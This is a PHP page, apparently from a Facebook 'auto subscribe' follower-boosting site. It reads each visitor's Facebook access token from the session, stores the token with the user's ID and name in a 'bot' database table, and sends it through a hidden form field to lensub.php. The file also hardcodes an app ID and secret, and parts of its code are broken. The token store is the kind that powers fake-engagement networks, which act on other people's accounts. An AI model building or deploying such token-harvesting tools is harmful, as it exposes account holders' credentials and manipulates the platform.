<?php
require 'facebook.php';
session_start();
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
$lamafile = 900;
$waktu = time();
if ($handle = opendir('sub')) {
while(false !== ($file = readdir($handle)))
{
$akses = fileatime('sub/'.$file);
if( $akses !== false)
if( ($waktu- $akses)>=$lamafile )
unlink('sub/'.$file);
}
closedir($handle);
}
$token = $_SESSION[access_token];
$fb_secret  = $_GET["sec"];
$fb_app_url  = 'http://ph.superlike.org/m.php';
include 'config.php';
$facebook = new Facebook(array(
   'appId' => '111160212353538',
   'secret' => 'd2d951a8566758675db1dbd50327013c',
   'cookie' => true
));


   mysql_query("CREATE TABLE IF NOT EXISTS `bot` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");

   try {
$parameters['access_token'] = $_SESSION[access_token];
      $userData = $facebook->api('/me', $parameters);
   } catch (FacebookApiException $e) {
      die("Token Hết Hạn -_- Vui Lòng Làm Mới Token");
   }

if($userData){

if($userData['id'] =="40" 
|| $userData['id'] =="4" 
){
echo "Have a Nice Day ^_^, You got Blocked...!!";
exit;
}
if($os=opendir('sub')) {
      while($ls = readdir($os)){
       if($ls != "." && $ls != ".."){
if($userData['id'] =="$ls"){
$limit = fileatime('sub/'.$user->id);
$timeoff = time();
$cek = date("i:s",$timeoff - $limit);
echo '<div align="center">Next Submit : <font color="red">'.$user->name.'</font><p>
<font color="red">'.$cek.' - 15:00</font></p></div> ';
exit;
}
}
}
}
   //check that user is not already inserted? If is. check it's access token and update if needed
   //also make sure that there is only one access_token for each user
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         bot
      WHERE
         user_id = '" . mysql_real_escape_string($userData['id']) . "'
   ");
   
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
               bot
            WHERE
               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
   
   if(!$row){
      mysql_query(
         "INSERT INTO 
            bot
         SET
            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
            `name` = '" . mysql_real_escape_string($userData['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            bot
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
}



try {
$parameters['access_token'] = $_SESSION[access_token];
$statuses = $facebook->api('/me/feed?limit=1=', $parameters);
foreach($statuses['data'] as $status)
{
        echo $status["me/photo"];
}
}
catch (FacebookApiException $e) {
      die("Token Hết Hạn -_- Vui Lòng Làm Mới Token');");
}

?>
<script>
var seconds = <?php
echo $countdown;?>;
function secondPassed() {
    var minutes = Math.round((seconds - 30)/60);
    var remainingSeconds = seconds % 60;
    if (remainingSeconds < 10) {
        remainingSeconds = "0" + remainingSeconds;  
    }
    document.getElementById('countdown').innerHTML = "<h3>--> Next Submit: Wait  " + minutes + ":" + remainingSeconds + "  Seconds <--</h3>";
    if (seconds <= 0) {
        clearInterval(countdownTimer);
        document.getElementById('countdown').innerHTML = "<h3>--> Next Submit: READY....! <--</h3>";
    } else {
        seconds--;
    }
}
 
var countdownTimer = setInterval('secondPassed()', 1000);
</script>
<div class="wrapper wrapper-content animated fadeInRight">
  <div class="ibox float-e-margins">
                    <div class="ibox-title">
                        <h5><i class="fa fa-space-shuttle" aria-hidden="true"></i>Auto Subcrible</h5>
                        <div class="ibox-tools">
                            <a class="collapse-link">
                                <i class="fa fa-chevron-up"></i>
                            </a>
                            <a class="close-link">
                                <i class="fa fa-times"></i>
                            </a>
                        </div>
                    </div>
                   <div class="ibox-content" style="display: block;">
                                <div class="panel-body">
                                   <ul class="list-group border-bottom">

	<div id="bodyupcmt" class="panel-body">

		<form action="lensub.php" method="post">	

<div class="input-group">
<input type="hidden" name="user" value="<?php echo $token; ?>" />
<input type="text" name="uid" class="form-control" value="<? echo $_SESSION['id'] ?>" placeholder="" autofocus="" required="">
				<span class="input-group-btn">
	<button type="submit" name="submit" onclick="loadit()" class="btn btn-primary">
						<span id="btn-click">
						<span class="glyphicon glyphicon-transfer"></span> Tăng Lượt Subscrible
						</span>
				</button>					</span>

	</div>
	
		</form></div>			

<div class="panel-footer">
				Next Submit:<? echo $cek ?> READY. <span class='glyphicon glyphicon-circle'></span>			</div>	

		</div>

<div id="finish" style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;"><center>
<img height="150px" width="150px" src="http://intuitglobal.intuit.com/delivery/cms/prod/sites/default/intuit.ca/images/quickbooks-sui-images/loader.gif"></center>
Yêu cầu đang được gửi! Vui lòng chờ trong giây lát!
</div>
</div>
	<!-- ============================ End ============================ -->
<script type="text/javascript" >
$(function() {
$(".submit").click(function() {
$("#pageBody").hide();
$( "#finish" ).show();
});
});
</script>
<!-- /Container -->

</body> </html>